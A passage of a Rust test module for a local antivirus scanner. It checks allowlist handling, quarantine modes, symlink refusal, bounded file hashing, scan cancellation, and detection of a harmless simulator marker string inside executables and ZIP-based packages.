            process_monitor_policy: None,
            duration_ms: None,
            poll_interval_ms: None,
            max_events: None,
        };

        let response = handle(command);

        assert_eq!(response["ok"], true);
        assert_eq!(response["watcher"]["active"], true);
        assert_eq!(response["watcher"]["mode"], "userModeBestEffort");
        assert_eq!(
            response["watcher"]["watched_paths"]
                .as_array()
                .unwrap()
                .len(),
            1
        );
        let limitations = response["watcher"]["limitations"].as_array().unwrap();
        for limitation in [
            "existing-accessible-paths-only",
            "one-shot-watch-plan-only",
            "no-persistent-service-monitor",
            "no-kernel-pre-execution-blocking",
        ] {
            assert!(limitations
                .iter()
                .any(|value| value.as_str() == Some(limitation)));
        }
    }

    #[test]
    fn watch_poll_scan_rejects_unbounded_duration() {
        let mut command = test_core_command("watch_poll_scan");
        command.duration_ms = Some(WATCH_POLL_MAX_DURATION_MS + 1);

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains("duration_ms must be between"));
    }

    #[test]
    fn watch_poll_scan_reports_stopped_when_no_paths_requested() {
        let command = test_core_command("watch_poll_scan");

        let response = handle(command);

        assert_eq!(response["ok"], true);
        assert_eq!(response["watcher"]["active"], false);
        assert_eq!(response["poll"]["active"], false);
        assert_eq!(response["poll"]["mode"], "stopped");
        let limitations = response["poll"]["limitations"].as_array().unwrap();
        for limitation in [
            "finite-polling-session-only",
            "post-write-detection-only",
            "bounded-polling-limits",
            "no-persistent-service-monitor",
            "no-kernel-pre-execution-blocking",
            "no-accessible-watch-paths",
        ] {
            assert!(limitations
                .iter()
                .any(|value| value.as_str() == Some(limitation)));
        }
    }

    #[test]
    fn list_allowlist_reports_corrupt_store_error() {
        let _lock = env_lock();
        let dir = tempdir().unwrap();
        let allowlist = dir.path().join("allowlist.json");
        fs::write(&allowlist, "{not-json").unwrap();
        unsafe {
            std::env::set_var("ZENTOR_ALLOWLIST_FILE", &allowlist);
        }
        let command: CoreCommand =
            serde_json::from_value(json!({"command": "list_allowlist"})).unwrap();

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains("unable to parse allowlist file"));
        unsafe {
            std::env::remove_var("ZENTOR_ALLOWLIST_FILE");
        }
    }

    #[test]
    fn detect_only_mode_hides_weak_suspicious_filename_observation() {
        let dir = tempdir().unwrap();
        let file = dir.path().join("invoice.pdf.exe");
        fs::write(&file, b"not malware, just a suspicious filename").unwrap();

        let report = scan_paths(
            vec![file.clone()],
            ScanActionMode::DetectOnly,
            ScanKind::Custom,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::Clean);
        assert_eq!(report.threats_found, 0);
        assert!(file.exists());
        assert!(report.threats.is_empty());
    }

    #[test]
    fn auto_quarantine_confirmed_only_suppresses_heuristic_only_medium_confidence() {
        let dir = tempdir().unwrap();
        let file = dir.path().join("invoice.pdf.exe");
        fs::write(&file, b"not malware, just a suspicious filename").unwrap();

        let report = scan_paths(
            vec![file.clone()],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Custom,
            None,
        )
        .unwrap();

        assert_eq!(report.threats_found, 0);
        assert_eq!(report.quarantined_files, 0);
        assert!(file.exists());
        assert!(report.threats.is_empty());
    }

    #[test]
    fn local_ai_unavailable_does_not_mark_file_clean() {
        let dir = tempdir().unwrap();
        let file = dir.path().join("tool.exe");
        fs::write(&file, b"developer tool").unwrap();
        let runner = ai::ModelRunner::default();

        assert_eq!(runner.status(), "developmentModel");
        let result = runner.classify_file(&file).unwrap().unwrap();
        assert!(!result.production_ready);
        assert_ne!(
            result.verdict,
            ai::verdict::LocalAiVerdictLabel::ConfirmedMalware
        );
    }

    #[test]
    fn signature_threat_builder_rejects_missing_hash() {
        let dir = tempdir().unwrap();
        let file = dir.path().join("eicar.com");
        fs::write(&file, b"EICAR fixture").unwrap();
        let result = scanner::ScanResult {
            status: ScanStatus::Infected,
            scanned_path: file.display().to_string(),
            sha256: String::new(),
            engine: "test-signature".to_string(),
            signature_name: Some("fixture".to_string()),
            threat_name: Some("fixture".to_string()),
            scanned_at: Utc::now(),
            duration_ms: 1,
            raw_engine_summary: None,
        };

        let error = threat_from_signature(&file, &result)
            .unwrap_err()
            .to_string();

        assert!(error.contains("missing SHA-256"));
    }

    #[test]
    fn signature_threat_name_default_is_explicit() {
        let mut result = scanner::ScanResult {
            status: ScanStatus::Infected,
            scanned_path: "C:/Temp/eicar.com".to_string(),
            sha256: "a".repeat(64),
            engine: "test-signature".to_string(),
            signature_name: Some("provider-signature".to_string()),
            threat_name: Some("Provider malware name".to_string()),
            scanned_at: Utc::now(),
            duration_ms: 1,
            raw_engine_summary: None,
        };
        let source = include_str!("main.rs");
        let start = source.find("fn threat_from_signature").unwrap();
        let end = source.find("fn threat_from_ai").unwrap();
        let signature_source = &source[start..end];

        assert_eq!(signature_threat_name(&result), "Provider malware name");
        result.threat_name = Some("   ".to_string());
        assert_eq!(signature_threat_name(&result), "Known malware signature");
        result.threat_name = None;
        assert_eq!(signature_threat_name(&result), "Known malware signature");
        assert!(signature_source.contains("threat_name: signature_threat_name(result)"));
        assert!(signature_source.contains("match result.threat_name.as_deref()"));
        assert!(signature_source.contains("Some(name) if !name.trim().is_empty()"));
        assert!(signature_source.contains("Some(_) => default_signature_threat_name()"));
        assert!(signature_source.contains("None => default_signature_threat_name()"));
        assert!(!signature_source.contains(".unwrap_or_else(|| \"Known malware signature\""));
    }

    #[test]
    fn local_core_sha256_for_file_streams_full_file() {
        let dir = tempdir().unwrap();
        let file = dir.path().join("large.bin");
        let bytes = vec![b'L'; 2 * 1024 * 1024 + 29];
        fs::write(&file, &bytes).unwrap();
        let mut hasher = Sha256::new();
        hasher.update(&bytes);
        let expected = format!("{:x}", hasher.finalize());

        assert_eq!(sha256_for_file(&file).unwrap(), expected);
    }

    #[test]
    fn local_core_sha256_for_file_is_size_bounded() {
        let source = include_str!("main.rs");
        let start = source.find("fn sha256_for_file").unwrap();
        let end = source
            .find("#[derive(Debug, Clone, Serialize, Deserialize)]")
            .unwrap();
        let hash_source = &source[start..end];

        assert!(source.contains("const MAX_LOCAL_CORE_HASH_BYTES"));
        assert!(hash_source
            .contains("let metadata = inspect_regular_scan_target(path, \"file to hash\")?"));
        assert!(hash_source.contains("metadata.len() > MAX_LOCAL_CORE_HASH_BYTES"));
        assert!(hash_source.contains("let mut total = 0_u64"));
        assert!(hash_source.contains("checked_add(read as u64)"));
        assert!(hash_source.contains("total > MAX_LOCAL_CORE_HASH_BYTES"));
        assert!(hash_source.contains("hasher.update(&buffer[..read])"));
    }

    #[cfg(unix)]
    #[test]
    fn local_core_scan_target_rejects_symbolic_links() {
        use std::os::unix::fs as unix_fs;

        let dir = tempdir().unwrap();
        let target = dir.path().join("target.bin");
        let link = dir.path().join("linked.bin");
        fs::write(&target, b"benign fixture").unwrap();
        unix_fs::symlink(&target, &link).unwrap();

        let inspect_error = inspect_regular_scan_target(&link, "scan target")
            .unwrap_err()
            .to_string();
        let hash_error = sha256_for_file(&link).unwrap_err().to_string();

        assert!(inspect_error.contains("symbolic link"));
        assert!(hash_error.contains("symbolic link"));
    }

    #[test]
    fn local_ai_threat_builder_rejects_non_file_targets() {
        let dir = tempdir().unwrap();
        let result = ai::model_runner::LocalAiResult {
            malware_probability: 0.91,
            top_category: "trojan".to_string(),
            category_scores: vec![("trojan".to_string(), 0.91)],
            confidence: "high".to_string(),
            verdict: ai::verdict::LocalAiVerdictLabel::ProbableMalware,
            explanation_reasons: vec!["fixture".to_string()],
            model_version: "test".to_string(),
            feature_schema_version: "test".to_string(),
            production_ready: false,
        };

        let error = threat_from_ai(dir.path(), &result).unwrap_err().to_string();

        assert!(error.contains("not a regular file"));
    }

    #[test]
    fn local_ai_threat_builder_rejects_unsupported_labels() {
        let dir = tempdir().unwrap();
        let file = dir.path().join("sample.exe");
        fs::write(&file, b"benign fixture").unwrap();
        let mut result = ai::model_runner::LocalAiResult {
            malware_probability: 0.91,
            top_category: "trojan".to_string(),
            category_scores: vec![("trojan".to_string(), 0.91)],
            confidence: "high".to_string(),
            verdict: ai::verdict::LocalAiVerdictLabel::ProbableMalware,
            explanation_reasons: vec!["fixture".to_string()],
            model_version: "test".to_string(),
            feature_schema_version: "test".to_string(),
            production_ready: false,
        };

        result.confidence = "certain".to_string();
        let confidence_error = threat_from_ai(&file, &result).unwrap_err().to_string();
        assert!(confidence_error.contains("unsupported confidence label"));

        result.confidence = "high".to_string();
        result.top_category = "policy_override".to_string();
        let category_error = threat_from_ai(&file, &result).unwrap_err().to_string();
        assert!(category_error.contains("unsupported category label"));

        let source = include_str!("main.rs");
        let confidence_start = source.find("fn local_ai_confidence").unwrap();
        let category_label_start = source.find("fn category_label").unwrap();
        let helper_source = &source[confidence_start..category_label_start];

        assert!(helper_source.contains("\"low\" => Ok(ThreatConfidence::Low)"));
        assert!(helper_source.contains("\"unknown\" => Ok(ThreatCategory::Unknown)"));
        assert!(helper_source.contains("unsupported confidence label"));
        assert!(helper_source.contains("unsupported category label"));
        assert!(!helper_source.contains("_ => ThreatConfidence::Low"));
        assert!(!helper_source.contains("_ => ThreatCategory::Unknown"));
    }

    #[test]
    fn full_scan_handles_inaccessible_or_missing_roots_as_skipped() {
        let dir = tempdir().unwrap();
        let missing = dir.path().join("missing");

        let report = scan_paths(
            vec![missing],
            ScanActionMode::DetectOnly,
            ScanKind::Full,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::CompletedWithErrors);
        assert_eq!(report.files_scanned, 0);
        assert_eq!(report.skipped_files, 1);
        assert_eq!(report.scan_errors.len(), 1);
        assert!(report.scan_errors[0].contains("scan root missing"));
    }

    #[test]
    fn scan_paths_reports_native_file_errors() {
        let dir = tempdir().unwrap();
        let file = dir.path().join("vanishes.exe");
        fs::write(&file, b"benign fixture").unwrap();
        let scan_target = file.clone();
        let disappearing_file = file.clone();
        let mut deleted = false;
        let mut emit = |_progress: &ScanProgress| {
            if !deleted {
                fs::remove_file(&disappearing_file).unwrap();
                deleted = true;
            }
        };

        let report = scan_paths(
            vec![scan_target],
            ScanActionMode::DetectOnly,
            ScanKind::Custom,
            Some(&mut emit),
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::CompletedWithErrors);
        assert_eq!(report.files_scanned, 0);
        assert_eq!(report.skipped_files, 1);
        assert_eq!(report.scan_errors.len(), 1);
        assert!(report.scan_errors[0].contains("vanishes.exe"));
        assert!(report.scan_errors[0].contains("metadata failed before scan"));
        assert!(report
            .message
            .as_deref()
            .unwrap()
            .contains("not reported clean"));
    }

    #[test]
    fn scan_paths_does_not_treat_metadata_failures_as_zero_byte_scans() {
        let source = include_str!("main.rs");
        let old_zero_byte_pattern = [
            "let file_size = std::fs::",
            "metadata(&path)\n            .map(|m| m.len())\n            .unwrap_or_default();",
        ]
        .concat();

        assert!(source.contains("metadata failed before scan"));
        assert!(source.contains("skipped_files = skipped_files.saturating_add(1);"));
        assert!(!source.contains(&old_zero_byte_pattern));
    }

    #[test]
    fn scan_and_threat_paths_use_non_following_target_metadata() {
        let source = include_str!("main.rs");
        let helper_pattern = ["fn inspect_regular_scan_", "target"].concat();
        let scan_pattern = ["inspect_regular_scan_", "target(&path, \"scan target\")"].concat();
        let signature_pattern = [
            "inspect_regular_scan_",
            "target(path, \"signature threat target\")",
        ]
        .concat();
        let ai_pattern = [
            "inspect_regular_scan_",
            "target(path, \"local AI threat target\")",
        ]
        .concat();
        let hash_pattern = ["inspect_regular_scan_", "target(path, \"file to hash\")?"].concat();
        let old_scan_metadata = ["std::fs::", "metadata(&path)"].concat();
        let old_threat_metadata = ["let metadata = std::fs::", "metadata(path)?"].concat();

        assert!(source.contains(&helper_pattern));
        assert!(source.contains("std::fs::symlink_metadata(path)"));
        assert!(source.contains("refusing to inspect symbolic link {label}"));
        assert!(source.contains("refusing to inspect reparse point {label}"));
        assert!(source.contains(&scan_pattern));
        assert!(source.contains(&signature_pattern));
        assert!(source.contains(&ai_pattern));
        assert!(source.contains(&hash_pattern));
        assert!(!source.contains(&old_scan_metadata));
        assert!(!source.contains(&old_threat_metadata));
    }

    #[test]
    fn scan_paths_does_not_count_failed_native_inspections_as_scanned() {
        let source = crate::normalized_test_source(include_str!("main.rs"));
        let scan_call = source
            .find("match engine.scan_file(path.clone(), AneScanActionMode::DetectOnly)")
            .expect("scan call marker");
        let success_increment = source
            .find("Ok(verdict) => {\n                files_scanned += 1;")
            .expect("success increment marker");
        let failure_detail = source
            .find("native scan failed")
            .expect("failure detail marker");

        assert!(scan_call < success_increment);
        assert!(scan_call < failure_detail);
        assert!(source.contains("skipped_files = skipped_files.saturating_add(1);"));
    }

    #[test]
    fn full_scan_time_budget_exit_reports_unscanned_remainder() {
        let source = include_str!("main.rs");

        assert!(source.contains("for (index, path) in walk.files.into_iter().enumerate()"));
        assert!(source.contains("let remaining_files = total_files.saturating_sub(index as u64);"));
        assert!(source.contains("full scan time budget reached"));
        assert!(source.contains("skipped {remaining_files} remaining file(s)"));
        assert!(!source.contains(
            "if kind == ScanKind::Full && started.elapsed().as_secs() >= FULL_SCAN_MAX_SECONDS {\n            skipped_files = skipped_files.saturating_add(1);\n            break;"
        ));
    }

    #[test]
    fn scan_paths_honors_cancel_request_between_files() {
        let _lock = env_lock();
        let dir = tempdir().unwrap();
        for index in 0..5 {
            fs::write(
                dir.path().join(format!("fixture-{index}.txt")),
                b"benign fixture",
            )
            .unwrap();
        }

        let mut requested = false;
        let mut emit = |_progress: &ScanProgress| {
            if !requested {
                requested = true;
                request_scan_cancellation().unwrap();
            }
        };

        let report = scan_paths(
            vec![dir.path().to_path_buf()],
            ScanActionMode::DetectOnly,
            ScanKind::Custom,
            Some(&mut emit),
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::Cancelled);
        assert_eq!(
            report.progress.as_ref().unwrap().status,
            ScanJobStatus::Cancelled
        );
        assert!(report.files_scanned < 5);
        assert!(report.skipped_files > 0);
        assert!(report
            .message
            .as_deref()
            .unwrap()
            .contains("queued file(s) were not scanned"));
        assert!(report
            .scan_errors
            .iter()
            .any(|error| error.contains("scan cancelled by user request")));
        assert!(!scan_cancellation_requested().unwrap());
    }

    #[test]
    fn scan_cancellation_reports_unscanned_remainder() {
        let source = include_str!("main.rs");

        assert!(source
            .contains("cancelled_remaining_files = total_files.saturating_sub(index as u64);"));
        assert!(source.contains("skipped {cancelled_remaining_files} remaining file(s)"));
        assert!(source.contains("queued file(s) were not scanned"));
        assert!(source.contains("ReportStatus::Cancelled"));
    }

    #[test]
    fn scan_cancellation_token_uses_staged_write_without_temp_leftover() {
        let _lock = env_lock();
        let dir = tempdir().unwrap();
        std::env::set_var("AVORAX_DATA_DIR", dir.path());

        let token = request_scan_cancellation().unwrap();

        assert!(token.exists());
        assert!(!token.with_extension("tmp").exists());
        assert!(scan_cancellation_requested().unwrap());
        clear_scan_cancellation().unwrap();
        assert!(!token.exists());
        std::env::remove_var("AVORAX_DATA_DIR");
    }

    #[cfg(unix)]
    #[test]
    fn scan_cancellation_token_symlink_fails_visibly() {
        use std::os::unix::fs::symlink;

        let _lock = env_lock();
        let dir = tempdir().unwrap();
        std::env::set_var("AVORAX_DATA_DIR", dir.path());
        let runtime = dir.path().join("runtime");
        fs::create_dir_all(&runtime).unwrap();
        let external = dir.path().join("external-token");
        let token = runtime.join("cancel-active-scan");
        fs::write(&external, "external").unwrap();
        symlink(&external, &token).unwrap();

        assert!(scan_cancellation_requested()
            .unwrap_err()
            .to_string()
            .contains("symbolic link"));
        let error = request_scan_cancellation().unwrap_err().to_string();
        assert!(error.contains("symbolic link"));
        assert!(clear_scan_cancellation()
            .unwrap_err()
            .to_string()
            .contains("symbolic link"));
        assert!(token.exists());
        assert_eq!(fs::read_to_string(external).unwrap(), "external");
        std::env::remove_var("AVORAX_DATA_DIR");
    }

    #[test]
    fn scan_cancellation_token_uses_non_following_exclusive_writes() {
        let source = include_str!("main.rs");
        let start = source.find("fn request_scan_cancellation(").unwrap();
        let end = start
            + source[start..]
                .find("fn should_surface_ai_result(")
                .unwrap();
        let token_source = &source[start..end];
        let old_write_pattern = ["std::fs::write(&temp_", "path"].concat();
        let old_cleanup_pattern = ["let _ = std::fs::remove_", "file(&temp_path);"].concat();

        assert!(token_source
            .contains("ensure_runtime_directory(parent, \"scan cancellation token parent\")?"));
        assert!(token_source.contains("write_runtime_file_exclusive"));
        assert!(token_source.contains("cleanup_staged_local_core_file"));
        assert!(token_source.contains("failed to clean up temporary scan cancellation token"));
        assert!(token_source.contains(".create_new(true)"));
        assert!(token_source.contains("sync_all()"));
        assert!(token_source
            .contains("remove_existing_runtime_file(&path, \"scan cancellation token\")"));
        assert!(token_source
            .contains("optional_runtime_file_present(&path, \"scan cancellation token\")"));
        assert!(token_source.contains("scan_cancellation_token_path()?"));
        assert!(token_source.contains("scan_cancellation_requested() -> anyhow::Result<bool>"));
        assert!(!token_source.contains("path.exists()"));
        assert!(!token_source.contains("temp_path.exists()"));
        assert!(!token_source.contains(&old_write_pattern));
        assert!(!token_source.contains(&old_cleanup_pattern));
    }

    #[test]
    fn safe_eicar_simulator_is_detected_and_auto_quarantined_by_confirmed_mode() {
        let dir = tempdir().unwrap();
        let file = dir.path().join("safe-eicar.com");
        fs::write(&file, "ZENTOR-SAFE-EICAR-SIMULATOR-FILE").unwrap();

        let report = scan_paths(
            vec![file.clone()],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Custom,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(report.threats.iter().any(|threat| {
            threat.confidence == ThreatConfidence::Confirmed
                && threat.status == ThreatResultStatus::Quarantined
                && threat
                    .quarantine_id
                    .as_deref()
                    .is_some_and(|id| !id.is_empty())
                && threat
                    .quarantine_path
                    .as_deref()
                    .is_some_and(|path| path.ends_with(".avoraxq"))
                && threat.quarantine_action_taken.as_deref() == Some("quarantined")
        }));
        assert!(report.quarantined_files >= 1);
        assert!(!file.exists());
    }

    #[test]
    fn full_scan_reports_pe_carrier_safe_simulators_and_quarantines_files() {
        let dir = tempdir().unwrap();
        let files = [
            dir.path().join("safe-simulator-library.dll"),
            dir.path().join("safe-simulator-driver.sys"),
            dir.path().join("safe-simulator-screensaver.scr"),
            dir.path().join("safe-simulator-payload.bin"),
        ];
        for file in &files {
            fs::write(file, "ZENTOR-SAFE-EICAR-SIMULATOR-FILE").unwrap();
        }

        let report = scan_paths(
            vec![dir.path().to_path_buf()],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Full,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        for file_name in [
            "safe-simulator-library.dll",
            "safe-simulator-driver.sys",
            "safe-simulator-screensaver.scr",
            "safe-simulator-payload.bin",
        ] {
            assert!(report.threats.iter().any(|threat| {
                threat.file_name == file_name
                    && threat.detection_type == DetectionType::Signature
                    && threat.confidence == ThreatConfidence::Confirmed
                    && threat.risk_score.verdict == RiskVerdict::ConfirmedMalware
                    && threat.status == ThreatResultStatus::Quarantined
                    && threat
                        .risk_score
                        .reasons
                        .iter()
                        .any(|reason| reason.id == "ZNE-ZENTOR-SAFE-TEST-001")
            }));
        }
        assert!(report.quarantined_files >= 4);
        for file in &files {
            assert!(
                !file.exists(),
                "expected {} to be quarantined",
                file.display()
            );
        }
    }

    #[test]
    fn quick_scan_reports_cpl_msu_safe_simulators_and_quarantines_files() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let cpl_file = downloads.join("safe-simulator-panel.cpl");
        let msu_file = downloads.join("safe-simulator-update.msu");
        fs::write(&cpl_file, "ZENTOR-SAFE-EICAR-SIMULATOR-FILE").unwrap();
        fs::write(&msu_file, "ZENTOR-SAFE-EICAR-SIMULATOR-FILE").unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        for file_name in ["safe-simulator-panel.cpl", "safe-simulator-update.msu"] {
            assert!(
                report.threats.iter().any(|threat| {
                    threat.file_name == file_name
                        && threat.detection_type == DetectionType::Signature
                        && threat.confidence == ThreatConfidence::Confirmed
                        && threat.risk_score.verdict == RiskVerdict::ConfirmedMalware
                        && threat.status == ThreatResultStatus::Quarantined
                        && threat
                            .risk_score
                            .reasons
                            .iter()
                            .any(|reason| reason.id == "ZNE-ZENTOR-SAFE-TEST-001")
                }),
                "expected confirmed quarantined CPL/MSU safe simulator threat for {file_name}; report: {report:#?}"
            );
        }
        assert!(report.quarantined_files >= 2);
        assert!(!cpl_file.exists());
        assert!(!msu_file.exists());
    }

    #[test]
    fn zip_entry_safe_simulator_is_detected_and_outer_archive_quarantined() {
        let dir = tempdir().unwrap();
        let file = dir.path().join("safe-simulator-archive.zip");
        fs::write(
            &file,
            zip_with_stored_entries(&[(
                b"payload/safe-eicar.txt",
                b"ZENTOR-SAFE-EICAR-SIMULATOR-FILE",
            )]),
        )
        .unwrap();

        let report = scan_paths(
            vec![file.clone()],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Custom,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(report.threats.iter().any(|threat| {
            threat.file_name == "safe-simulator-archive.zip"
                && threat.detection_type == DetectionType::Signature
                && threat.confidence == ThreatConfidence::Confirmed
                && threat.risk_score.verdict == RiskVerdict::ConfirmedMalware
                && threat.status == ThreatResultStatus::Quarantined
                && threat.risk_score.reasons.iter().any(|reason| {
                    reason.id == "ZNE-ZENTOR-SAFE-TEST-001"
                        && reason.detail.contains("payload/safe-eicar.txt")
                })
        }));
        assert!(report.quarantined_files >= 1);
        assert!(!file.exists());
    }

    #[test]
    fn jar_entry_safe_simulator_is_detected_and_outer_archive_quarantined() {
        let dir = tempdir().unwrap();
        let file = dir.path().join("safe-simulator-library.jar");
        fs::write(
            &file,
            zip_with_stored_entries(&[(
                b"payload/safe-eicar.txt",
                b"ZENTOR-SAFE-EICAR-SIMULATOR-FILE",
            )]),
        )
        .unwrap();

        let report = scan_paths(
            vec![file.clone()],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Custom,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(report.threats.iter().any(|threat| {
            threat.file_name == "safe-simulator-library.jar"
                && threat.detection_type == DetectionType::Signature
                && threat.confidence == ThreatConfidence::Confirmed
                && threat.risk_score.verdict == RiskVerdict::ConfirmedMalware
                && threat.status == ThreatResultStatus::Quarantined
                && threat.risk_score.reasons.iter().any(|reason| {
                    reason.id == "ZNE-ZENTOR-SAFE-TEST-001"
                        && reason.detail.contains("payload/safe-eicar.txt")
                })
        }));
        assert!(report.quarantined_files >= 1);
        assert!(!file.exists());
    }

    #[test]
    fn quick_scan_reports_apk_entry_safe_simulator_and_quarantines_outer_package() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("safe-simulator-mobile.apk");
        fs::write(
            &file,
            zip_with_stored_entries(&[(
                b"assets/safe-eicar.txt",
                b"ZENTOR-SAFE-EICAR-SIMULATOR-FILE",
            )]),
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(report.threats.iter().any(|threat| {
            threat.file_name == "safe-simulator-mobile.apk"
                && threat.detection_type == DetectionType::Signature
                && threat.confidence == ThreatConfidence::Confirmed
                && threat.risk_score.verdict == RiskVerdict::ConfirmedMalware
                && threat.status == ThreatResultStatus::Quarantined
                && threat.risk_score.reasons.iter().any(|reason| {
                    reason.id == "ZNE-ZENTOR-SAFE-TEST-001"
                        && reason.detail.contains("assets/safe-eicar.txt")
                })
        }));
        assert!(report.quarantined_files >= 1);
        assert!(!file.exists());
    }

    #[test]
    fn quick_scan_reports_xpi_entry_safe_simulator_and_quarantines_outer_package() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("safe-simulator-extension.xpi");
        fs::write(
            &file,
            zip_with_stored_entries(&[(
                b"assets/safe-eicar.txt",
                b"ZENTOR-SAFE-EICAR-SIMULATOR-FILE",
            )]),
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(report.threats.iter().any(|threat| {
            threat.file_name == "safe-simulator-extension.xpi"
                && threat.detection_type == DetectionType::Signature
                && threat.confidence == ThreatConfidence::Confirmed
                && threat.risk_score.verdict == RiskVerdict::ConfirmedMalware
                && threat.status == ThreatResultStatus::Quarantined
                && threat.risk_score.reasons.iter().any(|reason| {
                    reason.id == "ZNE-ZENTOR-SAFE-TEST-001"
                        && reason.detail.contains("assets/safe-eicar.txt")
                })
        }));
        assert!(report.quarantined_files >= 1);
        assert!(!file.exists());
    }

    #[test]
    fn quick_scan_reports_vsix_entry_safe_simulator_and_quarantines_outer_package() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("safe-simulator-editor-extension.vsix");
        fs::write(
            &file,
            zip_with_stored_entries(&[(
                b"extension/assets/safe-eicar.txt",
                b"ZENTOR-SAFE-EICAR-SIMULATOR-FILE",
            )]),
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(report.threats.iter().any(|threat| {
            threat.file_name == "safe-simulator-editor-extension.vsix"
                && threat.detection_type == DetectionType::Signature
                && threat.confidence == ThreatConfidence::Confirmed
                && threat.risk_score.verdict == RiskVerdict::ConfirmedMalware
                && threat.status == ThreatResultStatus::Quarantined
                && threat.risk_score.reasons.iter().any(|reason| {
                    reason.id == "ZNE-ZENTOR-SAFE-TEST-001"
                        && reason.detail.contains("extension/assets/safe-eicar.txt")
                })
        }));
        assert!(report.quarantined_files >= 1);
        assert!(!file.exists());
    }

    #[test]
    fn quick_scan_reports_nupkg_entry_safe_simulator_and_quarantines_outer_package() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("safe-simulator-library-package.nupkg");
        fs::write(
            &file,
            zip_with_stored_entries(&[(
                b"contentfiles/any/any/safe-eicar.txt",
                b"ZENTOR-SAFE-EICAR-SIMULATOR-FILE",
            )]),
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(report.threats.iter().any(|threat| {
            threat.file_name == "safe-simulator-library-package.nupkg"
                && threat.detection_type == DetectionType::Signature
                && threat.confidence == ThreatConfidence::Confirmed
                && threat.risk_score.verdict == RiskVerdict::ConfirmedMalware
                && threat.status == ThreatResultStatus::Quarantined
                && threat.risk_score.reasons.iter().any(|reason| {
                    reason.id == "ZNE-ZENTOR-SAFE-TEST-001"
                        && reason
                            .detail
                            .contains("contentfiles/any/any/safe-eicar.txt")
                })
        }));
        assert!(report.quarantined_files >= 1);
        assert!(!file.exists());
    }

    #[test]
    fn quick_scan_reports_appx_msix_entry_safe_simulator_and_quarantines_outer_packages() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let appx_file = downloads.join("safe-simulator-store-package.appx");
        let msix_file = downloads.join("safe-simulator-desktop-package.msix");
        fs::write(
            &appx_file,
            zip_with_stored_entries(&[(
                b"assets/safe-eicar.txt",
                b"ZENTOR-SAFE-EICAR-SIMULATOR-FILE",
            )]),
        )
        .unwrap();
        fs::write(
            &msix_file,
            zip_with_stored_entries(&[(
                b"vfs/programfiles/app/safe-eicar.txt",
                b"ZENTOR-SAFE-EICAR-SIMULATOR-FILE",
            )]),
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        for (file_name, entry_name) in [
            ("safe-simulator-store-package.appx", "assets/safe-eicar.txt"),
            (
                "safe-simulator-desktop-package.msix",
                "vfs/programfiles/app/safe-eicar.txt",
            ),
        ] {
            assert!(report.threats.iter().any(|threat| {
                threat.file_name == file_name
                    && threat.detection_type == DetectionType::Signature
                    && threat.confidence == ThreatConfidence::Confirmed
                    && threat.risk_score.verdict == RiskVerdict::ConfirmedMalware
                    && threat.status == ThreatResultStatus::Quarantined
                    && threat.risk_score.reasons.iter().any(|reason| {
                        reason.id == "ZNE-ZENTOR-SAFE-TEST-001"
                            && reason.detail.contains(entry_name)
                    })
            }));
        }
        assert!(report.quarantined_files >= 2);
        assert!(!appx_file.exists());
        assert!(!msix_file.exists());
    }

    #[test]
    fn quick_scan_reports_appxbundle_msixbundle_nested_package_safe_simulator() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
